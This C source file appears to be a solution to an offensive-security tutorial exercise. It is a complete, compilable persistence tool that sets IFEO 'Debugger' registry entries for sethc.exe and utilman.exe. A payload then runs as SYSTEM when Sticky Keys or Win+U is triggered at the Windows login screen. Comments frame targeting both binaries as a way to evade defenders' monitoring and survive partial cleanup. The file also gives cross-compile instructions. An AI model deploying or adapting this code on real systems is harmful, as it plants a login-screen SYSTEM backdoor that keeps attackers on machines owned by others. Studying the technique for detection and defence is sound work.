/*
 * exercise 4 solution
 * persistence: IFEO Debugger for sethc.exe AND utilman.exe
 * hack4.c
 * author: @cocomelonc
 *
 * base: 07-accessibility-features/pers.c
 *   original: hardcodes sethc.exe only
 *
 * change: refactor into a helper function and call it for both
 *   sethc.exe   (Sticky Keys    - triggered: Shift x5 at login screen)
 *   utilman.exe (Utility Manager - triggered: Win+U  at login screen)
 *
 * why both?
 *   defenders often monitor sethc.exe specifically.  registering a
 *   second accessibility binary doubles the persistence surface and
 *   ensures at least one survives a partial remediation.
 *
 * IFEO (Image File Execution Options) recap:
 *   HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\
 *     Image File Execution Options\<exe>\Debugger = <path>
 *   Windows launches <path> instead of <exe> when <exe> is started.
 *   At the login screen these binaries run as SYSTEM, so the debugger
 *   also runs as SYSTEM.
 *
 * compile (cross-compile from Linux):
 * x86_64-w64-mingw32-gcc hack4.c -o hack4.exe -I/usr/share/mingw-w64/include/ -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
 */
#include <windows.h>
#include <string.h>
#include <stdio.h>

/*
 * exercise 4 addition: set_ifeo_debugger()
 *
 * registers <debugger_path> as the "Debugger" for <target_exe>
 * under IFEO in HKLM.
 *
 * parameters:
 *   target_exe    - base filename, e.g. "sethc.exe"
 *   debugger_path - full path to the payload, e.g. "C:\Windows\System32\hack.exe"
 *
 * returns 0 on success, 1 on failure.
 */
static int set_ifeo_debugger(const char *target_exe, const char *debugger_path) {
  HKEY  hkey = NULL;
  char  keypath[512];
  DWORD disposition = 0;

  /* build the full IFEO subkey path */
  snprintf(keypath, sizeof(keypath),
           "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\"
           "Image File Execution Options\\%s",
           target_exe);

  /*
   * use RegCreateKeyEx so the key is created if it doesn't exist yet
   * (some IFEO entries are absent by default)
   */
  LONG res = RegCreateKeyEx(
    HKEY_LOCAL_MACHINE, keypath, 0, NULL,
    REG_OPTION_NON_VOLATILE, KEY_WRITE,
    NULL, &hkey, &disposition
  );
  if (res != ERROR_SUCCESS) {
    printf("[-] RegCreateKeyEx(%s) failed: %ld\n", target_exe, GetLastError());
    return 1;
  }

  res = RegSetValueEx(hkey, "Debugger", 0, REG_SZ,
                      (const BYTE*)debugger_path,
                      (DWORD)(strlen(debugger_path) + 1));
  RegCloseKey(hkey);

  if (res != ERROR_SUCCESS) {
    printf("[-] RegSetValueEx(Debugger) for %s failed: %ld\n",
           target_exe, GetLastError());
    return 1;
  }

  printf("[+] IFEO set: %-20s -> %s\n", target_exe, debugger_path);
  return 0;
}

int main(void) {
  /* path to the payload that will run instead of the accessibility binary */
  const char *debugger = "C:\\Windows\\System32\\hack.exe";

  int rc = 0;

  /*
   * exercise 4 change: call the helper for both targets.
   *
   * original: inline code, sethc.exe only.
   * updated:  set_ifeo_debugger() for sethc.exe and utilman.exe.
   *
   * trigger methods (at the Windows login screen):
   *   sethc.exe   - press Shift five times rapidly
   *   utilman.exe - press Win+U (or click the Ease of Access icon)
   */
  rc |= set_ifeo_debugger("sethc.exe",   debugger);
  rc |= set_ifeo_debugger("utilman.exe", debugger);

  if (rc == 0) {
    printf("[+] all IFEO entries installed\n");
  } else {
    printf("[-] one or more entries failed (check privileges - needs HKLM write)\n");
  }
  return rc;
}
